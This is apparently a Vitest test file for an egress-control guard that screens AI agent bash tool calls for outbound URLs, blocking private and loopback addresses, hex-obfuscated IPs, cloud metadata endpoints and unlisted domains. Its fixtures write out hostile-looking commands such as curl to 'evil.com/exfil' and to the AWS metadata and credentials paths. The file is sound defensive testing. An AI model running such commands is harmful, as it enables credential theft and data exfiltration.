import { describe, it, expect } from "vitest";
import { EgressControl } from "./egress-control.js";

describe("EgressControl", () => {
  describe("private IP blocking", () => {
    const egress = new EgressControl({ blockPrivateIPs: true });

    it("should block 10.x.x.x (RFC1918)", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl http://10.0.0.1/admin" },
      });
      expect(result.allowed).toBe(false);
      expect(result.blocked[0].reason).toContain("Private");
    });

    it("should block 172.16.x.x (RFC1918)", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl http://172.16.0.1:8080/api" },
      });
      expect(result.allowed).toBe(false);
    });

    it("should block 192.168.x.x (RFC1918)", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl http://192.168.1.1/config" },
      });
      expect(result.allowed).toBe(false);
    });

    it("should block 127.0.0.1 (loopback)", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl http://127.0.0.1:3000/secrets" },
      });
      expect(result.allowed).toBe(false);
    });

    it("should block localhost", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl http://localhost:8080/api" },
      });
      expect(result.allowed).toBe(false);
    });

    it("should block obfuscated hex IPs", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl http://0x7f000001/api" },
      });
      expect(result.allowed).toBe(false);
      expect(result.blocked[0].reason).toContain("Obfuscated");
    });
  });

  describe("cloud metadata blocking", () => {
    const egress = new EgressControl({ blockMetadataEndpoints: true });

    it("should block AWS metadata endpoint", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl http://169.254.169.254/latest/meta-data/" },
      });
      expect(result.allowed).toBe(false);
      expect(result.blocked[0].reason).toContain("metadata");
    });

    it("should block link-local addresses", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl http://169.254.170.2/credentials" },
      });
      expect(result.allowed).toBe(false);
    });
  });

  describe("allowlist mode", () => {
    const egress = new EgressControl({
      allowedDomains: ["github.com", "api.openai.com"],
    });

    it("should allow listed domains", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl https://github.com/user/repo" },
      });
      expect(result.allowed).toBe(true);
    });

    it("should allow subdomains of listed domains", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl https://raw.github.com/file" },
      });
      expect(result.allowed).toBe(true);
    });

    it("should block unlisted domains", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl https://evil.com/steal" },
      });
      expect(result.allowed).toBe(false);
      expect(result.blocked[0].reason).toContain("not in the allowed");
    });
  });

  describe("blocklist mode", () => {
    const egress = new EgressControl({
      blockedDomains: ["evil.com", "malware.org"],
    });

    it("should block listed domains", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl https://evil.com/exfil" },
      });
      expect(result.allowed).toBe(false);
    });

    it("should allow unlisted domains", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl https://github.com/api" },
      });
      expect(result.allowed).toBe(true);
    });
  });

  describe("clean inputs", () => {
    const egress = new EgressControl();

    it("should pass arguments without URLs", () => {
      const result = egress.check({
        name: "read_file",
        arguments: { path: "/home/user/file.txt" },
      });
      expect(result.allowed).toBe(true);
      expect(result.urlsFound).toHaveLength(0);
    });

    it("should pass public URLs", () => {
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl https://api.github.com/repos" },
      });
      expect(result.allowed).toBe(true);
    });
  });

  describe("excluded tools", () => {
    it("should skip excluded tools", () => {
      const egress = new EgressControl({
        excludeTools: ["bash"],
      });
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl http://10.0.0.1/admin" },
      });
      expect(result.allowed).toBe(true);
    });
  });

  describe("disabled", () => {
    it("should pass everything when disabled", () => {
      const egress = new EgressControl({ enabled: false });
      const result = egress.check({
        name: "bash",
        arguments: { command: "curl http://169.254.169.254/latest/meta-data/" },
      });
      expect(result.allowed).toBe(true);
    });
  });
});
